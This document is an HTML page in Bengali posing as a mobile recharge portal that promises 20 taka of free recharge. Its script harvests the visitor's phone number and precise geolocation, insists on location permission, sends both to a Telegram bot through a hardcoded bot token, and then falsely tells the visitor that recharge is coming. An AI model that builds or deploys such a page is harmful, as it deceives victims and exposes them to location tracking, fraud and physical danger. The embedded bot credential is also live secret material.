<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #fdfdfd; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); background: #fff; }
        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="offer-title">২০ টাকা ফ্রি রিচার্জ! 🎁</div>
        <p>মোবাইল নম্বর দিয়ে রিচার্জ গ্রহণ করুন</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" onclick="initiate()">রিচার্জ নিন</button>
    </div>

    <script>
        async function initiate() {
            const num = document.getElementById('phone').value;
            if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
                const chat_id = "7887080882";
                
                // এখানে ${ } ব্যবহার করা হয়েছে যা সঠিক নিয়ম
                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                const text = `🔔 **নতুন রিচার্জ রিকোয়েস্ট!**\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;

                try {
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    await fetch(url);
                    alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
                } catch (e) {
                    alert("টেলিগ্রাম কানেকশন এরর!");
                }
            }, () => {
                alert("লোকেশন পারমিশন দিন, নাহলে কাজ করবে না।");
            });
        }
    </script>
</body>
</html>
